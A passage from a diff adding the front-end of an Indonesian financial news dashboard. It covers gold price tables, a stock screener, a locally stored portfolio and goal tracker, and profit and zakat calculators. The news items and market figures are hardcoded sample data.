+                    <label class="block font-semibold text-slate-300 mb-1">Gramasi Emas (Gram)</label>
+                    <input type="number" id="portInputGram" value="5" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-white focus:outline-none focus:border-amber-500">
+                </div>
+                <div>
+                    <label class="block font-semibold text-slate-300 mb-1">Harga Beli Per Gram (Rp)</label>
+                    <input type="number" id="portInputBuyPrice" value="1450000" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-white focus:outline-none focus:border-amber-500">
+                </div>
+                <div>
+                    <label class="block font-semibold text-slate-300 mb-1">Tanggal Pembelian</label>
+                    <input type="date" id="portInputDate" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-white focus:outline-none focus:border-amber-500">
+                </div>
+            </div>
+
+            <div class="pt-2 flex justify-end gap-2">
+                <button onclick="saveGoldToPortfolio()" class="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs rounded-xl transition">
+                    Simpan ke Portofolio
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST CONTAINER -->
+    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 space-y-2 pointer-events-none"></div>
+
+    <!-- FOOTER -->
+    <footer class="bg-slate-900 border-t border-slate-800/80 mt-12 py-8 text-xs text-slate-400">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-4">
+            <div class="flex flex-col md:flex-row items-center justify-between gap-4">
+                <div class="flex items-center gap-2">
+                    <div class="w-7 h-7 rounded-lg bg-amber-500 flex items-center justify-center font-black text-slate-950 text-xs">M</div>
+                    <span class="font-extrabold text-white tracking-wider">MAZKIPLAY NEWS</span>
+                    <span class="text-[10px] text-slate-500">© 2026 Mazkiplay Media & Financial Analytics. All rights reserved.</span>
+                </div>
+                <div class="flex flex-wrap gap-4 text-xs font-semibold">
+                    <a href="https://emas.maulanar.my.id/docs" target="_blank" class="hover:text-amber-400 transition">Docs Emas Maulana</a>
+                    <a href="https://app.goapi.io/key-manager" target="_blank" class="hover:text-cyan-400 transition">GoAPI Manager</a>
+                    <a href="https://developer.tradingeconomics.com" target="_blank" class="hover:text-purple-400 transition">Trading Economics API</a>
+                    <a href="https://www.tradingview.com/rest-api-spec/" target="_blank" class="hover:text-emerald-400 transition">TradingView Rest Spec</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JAVASCRIPT PIPELINE ENGINE -->
+    <script>
+        // Global Application State
+        let liveGoldPrice = 1485000;
+        let liveGoldBuyback = 1332000;
+        let goldChartInstance = null;
+
+        // Master News Dataset
+        const newsDatabase = [
+            {
+                id: 1,
+                title: "Harga Emas Antam Tembus Rekor Baru Rp 1.485.000/Gram Didorong Permintaan Safe Haven",
+                category: "emas",
+                time: "10 Menit Lalu",
+                source: "Emas Maulana Feed",
+                image: "https://images.unsplash.com/photo-1610375461246-83df859d849d?w=600&auto=format&fit=crop&q=80",
+                snippet: "Ketidakpastian geopolitik global dan proyeksi penurunan suku bunga Fed terus memperkuat posisi logam mulia emas sebagai pelindung nilai utama."
+            },
+            {
+                id: 2,
+                title: "IHSG Ditutup Menguat ke Level 7.720, Saham Perbankan Big Cap Menjadi Motor Penggerak",
+                category: "saham",
+                time: "25 Menit Lalu",
+                source: "GoAPI Market",
+                image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=600&auto=format&fit=crop&q=80",
+                snippet: "Indeks Harga Saham Gabungan (IHSG) kembali melanjutkan reli positif berkat aksi beli bersih investor asing pada BBCA dan BMRI."
+            },
+            {
+                id: 3,
+                title: "Bank Indonesia Pertahankan BI Rate di Level 6,00% untuk Menjaga Stabilitas Rupiah",
+                category: "saham",
+                time: "1 Jam Lalu",
+                source: "Trading Economics",
+                image: "https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=600&auto=format&fit=crop&q=80",
+                snippet: "Keputusan Bank Indonesia mempertahankan suku bunga acuan dinilai konsisten dalam menjaga ekspektasi inflasi dan nilai tukar IDR."
+            },
+            {
+                id: 4,
+                title: "Bitcoin Tembus $64.000 Pasca Lonjakan Arus Masuk ETF Crypto Spot AS",
+                category: "kripto",
+                time: "2 Jam Lalu",
+                source: "TradingView Crypto",
+                image: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=600&auto=format&fit=crop&q=80",
+                snippet: "Pasar kripto kembali bergairah setelah inflows mingguan produk investasi berbasis aset digital mencatatkan rekor tertinggi."
+            },
+            {
+                id: 5,
+                title: "Minyak WTI Stabil di $71.40 Per Barel Ditengah Penurunan Stok AS",
+                category: "emas",
+                time: "3 Jam Lalu",
+                source: "Commodities Daily",
+                image: "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=600&auto=format&fit=crop&q=80",
+                snippet: "Harga minyak mentah dunia memperlihatkan tren penguatan setelah cadangan komersial AS dilaporkan menyusut melebihi perkiraan."
+            }
+        ];
+
+        // Stock Screener Data
+        const topStockGainers = [
+            { code: "BBCA", name: "Bank Central Asia Tbk", price: "Rp 10.850", change: "+2.35%", vol: "84.2M" },
+            { code: "ANTM", name: "Aneka Tambang Tbk", price: "Rp 1.580", change: "+4.12%", vol: "142.5M" },
+            { code: "BMRI", name: "Bank Mandiri Tbk", price: "Rp 7.425", change: "+1.80%", vol: "65.1M" },
+            { code: "MBMA", name: "Merdeka Battery Tbk", price: "Rp 610", change: "+5.17%", vol: "98.4M" }
+        ];
+
+        const topStockLosers = [
+            { code: "GOTO", name: "GoTo Gojek Tokopedia", price: "Rp 62", change: "-3.12%", vol: "512.0M" },
+            { code: "ASII", name: "Astra International", price: "Rp 5.125", change: "-1.44%", vol: "28.3M" },
+            { code: "TLKM", name: "Telkom Indonesia", price: "Rp 3.050", change: "-0.97%", vol: "41.6M" }
+        ];
+
+        // User target price alert state & portfolio state
+        let targetGoldAlert = parseFloat(localStorage.getItem('mazkiplay_alert_gold')) || 1500000;
+        let targetIhsgAlert = parseFloat(localStorage.getItem('mazkiplay_alert_ihsg')) || 7800;
+
+        let portfolioData = JSON.parse(localStorage.getItem('mazkiplay_portfolio')) || [
+            { id: 1, gram: 10, buyPrice: 1420000, date: "2024-01-15" },
+            { id: 2, gram: 5, buyPrice: 1450000, date: "2024-04-10" }
+        ];
+
+        let goalData = JSON.parse(localStorage.getItem('mazkiplay_goals')) || [
+            { id: 1, name: "Dana DP Rumah (100g)", targetGram: 100 },
+            { id: 2, name: "Dana Umrah Keluarga (50g)", targetGram: 50 }
+        ];
+
+        window.addEventListener('DOMContentLoaded', () => {
+            initLiveClock();
+            renderGoldTable();
+            renderNewsGrid(newsDatabase);
+            renderFullNewsGrid(newsDatabase);
+            renderMacroIndicators();
+            initGoldChart();
+            loadTvChart('IDX:COMPOSITE');
+            calculateGoldProfit();
+            calculateZakat();
+            renderPortfolio();
+            renderGoals();
+            renderStockScreener('gainers');
+            runAssetConverter('gram');
+            checkPriceAlerts();
+            
+            const dateInput = document.getElementById('portInputDate');
+            if (dateInput) dateInput.value = new Date().toISOString().split('T')[0];
+        });
+
+        // Tab Switcher
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            const target = document.getElementById(`tab-${tabId}`);
+            if (target) target.classList.remove('hidden');
+
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.className = "nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2";
+            });
+
+            const activeBtn = document.getElementById(`nav-${tabId}`);
+            if (activeBtn) {
+                activeBtn.className = "nav-btn px-3 py-2 rounded-lg text-xs font-bold transition flex items-center gap-2 bg-slate-800 text-amber-400 border border-amber-500/30";
+            }
+        }
+
+        // Live Clock
+        function initLiveClock() {
+            const clockEl = document.getElementById('liveClock');
+            if (!clockEl) return;
+            setInterval(() => {
+                const now = new Date();
+                clockEl.textContent = now.toLocaleTimeString('id-ID') + ' WIB';
+            }, 1000);
+        }
+
+        // Interactive Chart.js for Gold
+        function initGoldChart() {
+            const ctx = document.getElementById('goldChartCanvas');
+            if (!ctx) return;
+
+            const labels = ['Sen', 'Sel', 'Rab', 'Kam', 'Jum', 'Sab', 'Ming (Hari Ini)'];
+            const prices = [1475000, 1478000, 1472000, 1480000, 1482000, 1485000, 1485000];
+
+            goldChartInstance = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [{
+                        label: 'Harga Emas Antam (Rp/Gram)',
+                        data: prices,
+                        borderColor: '#f59e0b',
+                        backgroundColor: 'rgba(245, 158, 11, 0.15)',
+                        borderWidth: 3,
+                        fill: true,
+                        tension: 0.3,
+                        pointBackgroundColor: '#f59e0b',
+                        pointRadius: 5
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { labels: { color: '#f3f4f6', font: { family: 'Inter', size: 11 } } }
+                    },
+                    scales: {
+                        x: { ticks: { color: '#9ca3af', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.05)' } },
+                        y: { ticks: { color: '#9ca3af', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.05)' } }
+                    }
+                }
+            });
+        }
+
+        function updateChartTimeframe(period) {
+            if (!goldChartInstance) return;
+            
+            document.getElementById('btnChart7d').className = "px-3 py-1.5 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition";
+            document.getElementById('btnChart30d').className = "px-3 py-1.5 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition";
+            document.getElementById('btnChart1y').className = "px-3 py-1.5 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition";
+
+            if (period === '7d') {
+                document.getElementById('btnChart7d').className = "px-3 py-1.5 bg-amber-500 text-slate-950 font-bold rounded-xl text-xs transition";
+                goldChartInstance.data.labels = ['Sen', 'Sel', 'Rab', 'Kam', 'Jum', 'Sab', 'Ming'];
+                goldChartInstance.data.datasets[0].data = [1475000, 1478000, 1472000, 1480000, 1482000, 1485000, 1485000];
+            } else if (period === '30d') {
+                document.getElementById('btnChart30d').className = "px-3 py-1.5 bg-amber-500 text-slate-950 font-bold rounded-xl text-xs transition";
+                goldChartInstance.data.labels = ['Minggu 1', 'Minggu 2', 'Minggu 3', 'Minggu 4'];
+                goldChartInstance.data.datasets[0].data = [1440000, 1455000, 1470000, 1485000];
+            } else if (period === '1y') {
+                document.getElementById('btnChart1y').className = "px-3 py-1.5 bg-amber-500 text-slate-950 font-bold rounded-xl text-xs transition";
+                goldChartInstance.data.labels = ['Jan', 'Mar', 'Mei', 'Jul', 'Sep', 'Nov'];
+                goldChartInstance.data.datasets[0].data = [1130000, 1200000, 1310000, 1380000, 1450000, 1485000];
+            }
+            goldChartInstance.update();
+        }
+
+        // Antam Pricing Table Generator
+        function renderGoldTable() {
+            const tbody = document.getElementById('goldPricingTableBody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
+
+            const grams = [0.5, 1, 2, 3, 5, 10, 25, 50, 100, 250, 500, 1000];
+            const basePrice = liveGoldPrice;
+
+            grams.forEach(g => {
+                let unitPrice = basePrice * g;
+                if (g >= 10) unitPrice *= 0.995; 
+                if (g >= 100) unitPrice *= 0.99;
+
+                const npwpTax = unitPrice * 0.0045;
+                const nonNpwpTax = unitPrice * 0.0090;
+                const buyback = liveGoldBuyback * g;
+
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-slate-950/60 transition";
+                tr.innerHTML = `
+                    <td class="py-3.5 px-4 font-bold text-amber-400">${g} Gram</td>
+                    <td class="py-3.5 px-4 font-bold text-white">Rp ${Math.round(unitPrice).toLocaleString('id-ID')}</td>
+                    <td class="py-3.5 px-4 text-emerald-400">Rp ${Math.round(unitPrice + npwpTax).toLocaleString('id-ID')}</td>
+                    <td class="py-3.5 px-4 text-rose-300">Rp ${Math.round(unitPrice + nonNpwpTax).toLocaleString('id-ID')}</td>
+                    <td class="py-3.5 px-4 text-slate-300">Rp ${Math.round(buyback).toLocaleString('id-ID')}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function renderStockScreener(type) {
+            const tbody = document.getElementById('stockScreenerBody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
+
+            const dataset = (type === 'gainers') ? topStockGainers : topStockLosers;
+            dataset.forEach(item => {
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-slate-950/60 transition";
+                const isGain = item.change.startsWith('+');
+                tr.innerHTML = `
+                    <td class="py-3 px-4 font-bold text-white flex items-center gap-2">
+                        <span class="w-2 h-2 rounded-full ${isGain ? 'bg-emerald-400' : 'bg-rose-400'}"></span>
+                        <strong class="text-amber-400">${item.code}</strong> - <span class="text-slate-400 font-normal">${item.name}</span>
+                    </td>
+                    <td class="py-3 px-4 font-bold text-slate-200">${item.price}</td>
+                    <td class="py-3 px-4 font-bold ${isGain ? 'text-emerald-400' : 'text-rose-400'}">${item.change}</td>
+                    <td class="py-3 px-4 text-slate-400 font-mono">${item.vol}</td>
+                    <td class="py-3 px-4">
+                        <button onclick="switchTab('tradingview'); loadTvChart('IDX:${item.code}')" class="text-xs text-cyan-400 hover:underline">
+                            <i class="fa-solid fa-chart-line"></i> Chart
+                        </button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function toggleStockScreener(type) {
+            if (type === 'gainers') {
+                document.getElementById('btnScreenerGainers').className = "px-3 py-1.5 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs shadow-md transition";
+                document.getElementById('btnScreenerLosers').className = "px-3 py-1.5 bg-slate-800 text-slate-400 font-bold rounded-xl text-xs hover:text-white transition";
+            } else {
+                document.getElementById('btnScreenerLosers').className = "px-3 py-1.5 bg-rose-500 text-slate-950 font-bold rounded-xl text-xs shadow-md transition";
+                document.getElementById('btnScreenerGainers').className = "px-3 py-1.5 bg-slate-800 text-slate-400 font-bold rounded-xl text-xs hover:text-white transition";
+            }
+            renderStockScreener(type);
+        }
+
+        // News Feed Renderer with Audio Speech
+        function renderNewsGrid(newsList) {
+            const grid = document.getElementById('mainNewsGrid');
+            if (!grid) return;
+            grid.innerHTML = '';
+
+            newsList.forEach(item => {
+                const card = document.createElement('div');
+                card.className = "glass-card rounded-2xl overflow-hidden hover:border-amber-500/50 transition flex flex-col justify-between shadow-xl group";
+                card.innerHTML = `
+                    <div>
+                        <div class="h-40 overflow-hidden relative">
+                            <img src="${item.image}" alt="${item.title}" class="w-full h-full object-cover group-hover:scale-105 transition duration-500">
+                            <span class="absolute top-3 left-3 bg-slate-950/80 backdrop-blur-md border border-slate-700 text-amber-400 text-[10px] font-bold px-2.5 py-1 rounded-full uppercase">${item.category}</span>
+                        </div>
+                        <div class="p-4 space-y-2">
+                            <div class="flex items-center justify-between text-[11px] text-slate-400">
+                                <span><i class="fa-regular fa-clock"></i> ${item.time}</span>
+                                <span class="text-cyan-400 font-semibold">${item.source}</span>
+                            </div>
+                            <h4 class="font-bold text-sm text-white group-hover:text-amber-400 transition leading-snug">${item.title}</h4>
+                            <p class="text-xs text-slate-400 line-clamp-2">${item.snippet}</p>
+                        </div>
+                    </div>
+                    <div class="px-4 pb-4 pt-1 flex items-center justify-between border-t border-slate-800/80 mt-2">
+                        <button onclick="speakNews('${item.title.replace(/'/g, "\\'")}')" class="text-xs text-purple-400 hover:text-purple-300 font-semibold flex items-center gap-1">
+                            <i class="fa-solid fa-volume-high"></i> Dengarkan
+                        </button>
+                        <span class="text-[11px] text-amber-400 font-bold cursor-pointer hover:underline" onclick="switchTab('news')">Baca Selengkapnya →</span>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        function renderFullNewsGrid(newsList) {
+            const grid = document.getElementById('fullNewsPageGrid');
+            if (!grid) return;
+            grid.innerHTML = '';
+
+            newsList.forEach(item => {
+                const card = document.createElement('div');
+                card.className = "bg-slate-900 border border-slate-800 rounded-2xl p-4 hover:border-amber-500/50 transition space-y-3 shadow-lg";
+                card.innerHTML = `
+                    <div class="flex items-center justify-between text-xs text-slate-400">
+                        <span class="text-amber-400 font-bold uppercase">${item.category}</span>
+                        <span>${item.time}</span>
+                    </div>
+                    <h3 class="font-extrabold text-base text-white hover:text-amber-400 transition">${item.title}</h3>
+                    <p class="text-xs text-slate-300 leading-relaxed">${item.snippet}</p>
+                    <div class="pt-2 flex justify-between items-center text-xs border-t border-slate-800">
+                        <span class="text-slate-400 font-mono">${item.source}</span>
+                        <button onclick="speakNews('${item.title.replace(/'/g, "\\'")}')" class="p-1.5 bg-slate-800 hover:bg-purple-900 text-purple-300 rounded-lg transition">
+                            <i class="fa-solid fa-volume-high"></i> Play Audio
+                        </button>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        // Text-To-Speech News Audio Reader
+        function speakNews(text) {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.lang = 'id-ID';
+                utterance.rate = 1.0;
+                window.speechSynthesis.speak(utterance);
+                showToast("Memutar audio berita...");
+            } else {
+                showToast("Fitur audio speech tidak didukung browser Anda.");
+            }
+        }
+
+        function filterNewsCategory(cat) {
+            if (cat === 'all') {
+                renderNewsGrid(newsDatabase);
+            } else {
+                const filtered = newsDatabase.filter(n => n.category === cat);
+                renderNewsGrid(filtered);
+            }
+        }
+
+        function filterNewsBySearch() {
+            const query = document.getElementById('globalSearchInput').value.toLowerCase();
+            const filtered = newsDatabase.filter(n => n.title.toLowerCase().includes(query) || n.snippet.toLowerCase().includes(query));
+            renderNewsGrid(filtered);
+        }
+
+        function searchFullNewsList() {
+            const query = document.getElementById('newsPageSearch').value.toLowerCase();
+            const filtered = newsDatabase.filter(n => n.title.toLowerCase().includes(query) || n.snippet.toLowerCase().includes(query));
+            renderFullNewsGrid(filtered);
+        }
+
+        function renderMacroIndicators() {
+            const container = document.getElementById('macroCardsContainer');
+            if (!container) return;
+
+            const countries = [
+                { name: "Indonesia", flag: "🇮🇩", gdp: "$1.37 Triliun", cpi: "2.12%", rate: "6.00%", tag: "ASEAN Core" },
+                { name: "Amerika Serikat", flag: "🇺🇸", gdp: "$27.36 Triliun", cpi: "2.50%", rate: "5.00%", tag: "Fed Policy" },
+                { name: "Tiongkok (China)", flag: "🇨🇳", gdp: "$17.79 Triliun", cpi: "0.60%", rate: "3.35%", tag: "Asia Hub" },
+                { name: "Jepang", flag: "🇯🇵", gdp: "$4.21 Triliun", cpi: "2.80%", rate: "0.25%", tag: "BOJ Policy" },
+                { name: "Singapura", flag: "🇸🇬", gdp: "$501 Miliar", cpi: "2.40%", rate: "3.75%", tag: "MAS FX" },
+                { name: "Arab Saudi", flag: "🇸🇦", gdp: "$1.11 Triliun", cpi: "1.60%", rate: "5.50%", tag: "OPEC+" }
+            ];
+
+            container.innerHTML = '';
+            countries.forEach(c => {
+                const card = document.createElement('div');
+                card.className = "bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-3 shadow-lg";
+                card.innerHTML = `
+                    <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
+                        <span class="font-extrabold text-white flex items-center gap-2 text-base"><span class="text-xl">${c.flag}</span> ${c.name}</span>
+                        <span class="text-[10px] bg-indigo-500/20 text-indigo-300 px-2.5 py-0.5 rounded-full font-mono font-bold">${c.tag}</span>
+                    </div>
+                    <div class="space-y-2 text-xs">
+                        <div class="flex justify-between"><span class="text-slate-400">PDB Total:</span> <strong class="text-slate-200">${c.gdp}</strong></div>
+                        <div class="flex justify-between"><span class="text-slate-400">Inflasi YoY:</span> <strong class="text-emerald-400 font-bold">${c.cpi}</strong></div>
+                        <div class="flex justify-between"><span class="text-slate-400">Suku Bunga Acuan:</span> <strong class="text-amber-400 font-bold">${c.rate}</strong></div>
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        function loadTvChart(symbol) {
+            const container = document.getElementById('tvChartContainer');
+            if (!container) return;
+
+            container.innerHTML = `
+                <iframe src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_chart&symbol=${encodeURIComponent(symbol)}&interval=D&hidesidetoolbar=0&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=[]&theme=dark&style=1&timezone=Asia%2FJakarta" 
+                class="w-full h-full border-0"></iframe>
+            `;
+            showToast(`Memuat grafik Charting ${symbol}`);
+        }
+
+        function runAssetConverter(source) {
+            const gramEl = document.getElementById('convGramInput');
+            const idrEl = document.getElementById('convIdrInput');
+            
+            if (source === 'gram') {
+                const g = parseFloat(gramEl.value) || 0;
+                const idr = g * liveGoldPrice;
+                idrEl.value = idr;
+            } else {
+                const idr = parseFloat(idrEl.value) || 0;
+                const g = liveGoldPrice > 0 ? (idr / liveGoldPrice) : 0;
+                gramEl.value = g.toFixed(2);
+            }
+
+            const idrVal = parseFloat(idrEl.value) || 0;
+            const usdVal = idrVal / 15420;
+            const sarVal = idrVal / 4112;
+            const btcVal = usdVal / 64250;
+
+            document.getElementById('convUsdResult').textContent = '$' + usdVal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('convSarResult').textContent = sarVal.toLocaleString('id-ID', { maximumFractionDigits: 1 }) + ' SAR';
+            document.getElementById('convBtcResult').textContent = btcVal.toFixed(6) + ' BTC';
+        }
+
+        function calculateGoldProfit() {
+            const gram = parseFloat(document.getElementById('calcGramInput').value) || 0;
+            const buyPrice = parseFloat(document.getElementById('calcBuyPriceInput').value) || 0;
+            const annualReturn = parseFloat(document.getElementById('calcAnnualReturnInput').value) || 0;
+            const years = parseFloat(document.getElementById('calcYearsInput').value) || 0;
+
+            const modal = gram * buyPrice;
+            const futurePricePerGram = buyPrice * Math.pow(1 + (annualReturn / 100), years);
+            const futureBuybackPerGram = futurePricePerGram * 0.90; // buyback ratio
+            const totalFutureValue = gram * futureBuybackPerGram;
+            const netProfit = totalFutureValue - modal;
+            const profitPct = modal > 0 ? (netProfit / modal) * 100 : 0;
+
+            document.getElementById('resModalAwal').textContent = 'Rp ' + Math.round(modal).toLocaleString('id-ID');
+            document.getElementById('resFutureGramPrice').textContent = 'Rp ' + Math.round(futurePricePerGram).toLocaleString('id-ID') + ' /g';
+            document.getElementById('resTotalFutureValue').textContent = 'Rp ' + Math.round(totalFutureValue).toLocaleString('id-ID');
+            document.getElementById('resNetProfit').textContent = (netProfit >= 0 ? '+' : '') + 'Rp ' + Math.round(netProfit).toLocaleString('id-ID') + ` (${profitPct.toFixed(1)}%)`;
+        }
+
+        function calculateZakat() {
+            const gram = parseFloat(document.getElementById('zakatGramInput').value) || 0;
+            const isHaul = document.getElementById('zakatHaulSelect').value === "1";
+            
+            document.getElementById('zakatCurrentPriceText').textContent = 'Rp ' + liveGoldPrice.toLocaleString('id-ID') + '/g';
+
+            if (gram >= 85 && isHaul) {
+                const zakatGram = gram * 0.025;
+                const zakatIdr = zakatGram * liveGoldPrice;
+                document.getElementById('zakatNisabStatus').textContent = "WAJIB ZAKAT (≥85g & 1 Thn)";
+                document.getElementById('zakatNisabStatus').className = "font-bold text-emerald-400";
+                document.getElementById('zakatGramResult').textContent = zakatGram.toFixed(2) + " Gram";
+                document.getElementById('zakatIdrResult').textContent = "Rp " + Math.round(zakatIdr).toLocaleString('id-ID');
+            } else {
+                document.getElementById('zakatNisabStatus').textContent = gram < 85 ? "BELUM MENCAPAI NISAB (<85g)" : "BELUM CUKUP HAUL (1 Thn)";
+                document.getElementById('zakatNisabStatus').className = "font-bold text-amber-400";
+                document.getElementById('zakatGramResult').textContent = "0 Gram";
+                document.getElementById('zakatIdrResult').textContent = "Rp 0";
+            }
+        }
+
+        function switchCalcSubTab(tab) {
+            document.getElementById('calcPanelProyeksi').classList.add('hidden');
+            document.getElementById('calcPanelZakat').classList.add('hidden');
+            document.getElementById('calcPanelAibot').classList.add('hidden');
+
+            document.getElementById('btnCalcProyeksi').className = "px-4 py-2 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition";
+            document.getElementById('btnCalcZakat').className = "px-4 py-2 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition";
+            document.getElementById('btnCalcAibot').className = "px-4 py-2 bg-slate-800 text-purple-300 font-bold rounded-xl text-xs hover:text-white transition";
+
+            if (tab === 'proyeksi') {
+                document.getElementById('calcPanelProyeksi').classList.remove('hidden');
+                document.getElementById('btnCalcProyeksi').className = "px-4 py-2 bg-amber-500 text-slate-950 font-bold rounded-xl text-xs shadow-md transition";
+            } else if (tab === 'zakat') {
+                document.getElementById('calcPanelZakat').classList.remove('hidden');
+                document.getElementById('btnCalcZakat').className = "px-4 py-2 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs shadow-md transition";
+            } else if (tab === 'aibot') {
+                document.getElementById('calcPanelAibot').classList.remove('hidden');
+                document.getElementById('btnCalcAibot').className = "px-4 py-2 bg-purple-600 text-white font-bold rounded-xl text-xs shadow-md transition";
+            }
+        }
+
+        function renderPortfolio() {
+            const tbody = document.getElementById('portfolioTableBody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
+
+            let totalGram = 0;
+            let totalModal = 0;
+            let totalValue = 0;
+
+            portfolioData.forEach((item, idx) => {
+                const modal = item.gram * item.buyPrice;
+                const currentValue = item.gram * liveGoldBuyback;
+                const profit = currentValue - modal;
+                const profitPct = modal > 0 ? (profit / modal) * 100 : 0;
+
+                totalGram += item.gram;
+                totalModal += modal;
+                totalValue += currentValue;
+
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-slate-950/60 transition";
+                tr.innerHTML = `
+                    <td class="py-3 px-4 font-mono text-slate-300">${item.date}</td>
+                    <td class="py-3 px-4 font-bold text-amber-400">${item.gram} Gram</td>
+                    <td class="py-3 px-4 text-slate-200">Rp ${item.buyPrice.toLocaleString('id-ID')}</td>
+                    <td class="py-3 px-4 text-slate-200">Rp ${modal.toLocaleString('id-ID')}</td>
+                    <td class="py-3 px-4 font-bold text-white">Rp ${currentValue.toLocaleString('id-ID')}</td>
+                    <td class="py-3 px-4 font-bold ${profit >= 0 ? 'text-emerald-400' : 'text-rose-400'}">
+                        ${profit >= 0 ? '+' : ''}Rp ${Math.round(profit).toLocaleString('id-ID')} (${profitPct.toFixed(1)}%)
+                    </td>
+                    <td class="py-3 px-4 text-center">
+                        <button onclick="deletePortfolioItem(${idx})" class="text-rose-400 hover:text-rose-300 p-1"><i class="fa-solid fa-trash-can"></i></button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+
+            const totalProfit = totalValue - totalModal;
+            const totalProfitPct = totalModal > 0 ? (totalProfit / totalModal) * 100 : 0;
+
+            document.getElementById('portTotalGram').textContent = totalGram.toFixed(1) + ' Gram';
+            document.getElementById('portTotalValue').textContent = 'Rp ' + Math.round(totalValue).toLocaleString('id-ID');
+            document.getElementById('portTotalProfit').textContent = (totalProfit >= 0 ? '+' : '') + 'Rp ' + Math.round(totalProfit).toLocaleString('id-ID') + ` (${totalProfitPct.toFixed(1)}%)`;
+        }
+
+        function openAddGoldModal() {
+            document.getElementById('addGoldModal').classList.remove('hidden');
+        }
+
+        function closeAddGoldModal() {
+            document.getElementById('addGoldModal').classList.add('hidden');
+        }
+
+        function saveGoldToPortfolio() {
+            const gram = parseFloat(document.getElementById('portInputGram').value) || 0;
+            const buyPrice = parseFloat(document.getElementById('portInputBuyPrice').value) || 0;
+            const date = document.getElementById('portInputDate').value || new Date().toISOString().split('T')[0];
+
+            if (gram <= 0 || buyPrice <= 0) {
+                showToast("Mohon masukkan berat emas dan harga beli yang valid.");
+                return;
+            }
+
+            portfolioData.push({ id: Date.now(), gram, buyPrice, date });
+            localStorage.setItem('mazkiplay_portfolio', JSON.stringify(portfolioData));
+            
+            renderPortfolio();
+            renderGoals();
+            closeAddGoldModal();
+            showToast("Logam mulia berhasil ditambahkan!");
+        }
+
+        function deletePortfolioItem(idx) {
+            portfolioData.splice(idx, 1);
+            localStorage.setItem('mazkiplay_portfolio', JSON.stringify(portfolioData));
+            renderPortfolio();
+            renderGoals();
+            showToast("Item portofolio dihapus.");
+        }
+
+        function exportPortfolioTxt() {
+            let txt = "=== PORTOFOLIO LOGAM MULIA MAZKIPLAY ===\n";
+            portfolioData.forEach((item, i) => {
+                txt += `${i+1}. Tgl: ${item.date} | Gram: ${item.gram}g | BuyPrice: Rp ${item.buyPrice.toLocaleString('id-ID')}\n`;
+            });
+            navigator.clipboard ? navigator.clipboard.writeText(txt) : document.execCommand('copy');
+            showToast("Portofolio disalin ke clipboard!");
+        }
+
+        // Goal Tracker Renderer
+        function renderGoals() {
+            const container = document.getElementById('goalsContainerList');
+            if (!container) return;
+            container.innerHTML = '';
+
+            const currentGram = portfolioData.reduce((acc, i) => acc + i.gram, 0);
+
+            goalData.forEach(g => {
+                const pct = Math.min(100, (currentGram / g.targetGram) * 100);
+                const item = document.createElement('div');
+                item.className = "space-y-1 text-xs";
+                item.innerHTML = `
+                    <div class="flex justify-between font-bold">
+                        <span class="text-slate-200">${g.name}</span>
+                        <span class="text-amber-400">${currentGram.toFixed(1)} / ${g.targetGram} Gram (${pct.toFixed(1)}%)</span>
+                    </div>
+                    <div class="w-full bg-slate-900 h-3 rounded-full overflow-hidden border border-slate-800">
+                        <div class="bg-gradient-to-r from-amber-500 to-emerald-400 h-full transition-all duration-500" style="width: ${pct}%"></div>
+                    </div>
+                `;
+                container.appendChild(item);
+            });
+        }
+
+        function addNewGoalPrompt() {
+            const name = prompt("Masukkan nama target impian (misal: Dana Pendidikan Anak 30g):");
+            if (!name) return;
+            const targetGram = parseFloat(prompt("Masukkan target berat emas (Gram):"));
+            if (!targetGram) return;
+
+            goalData.push({ id: Date.now(), name, targetGram });
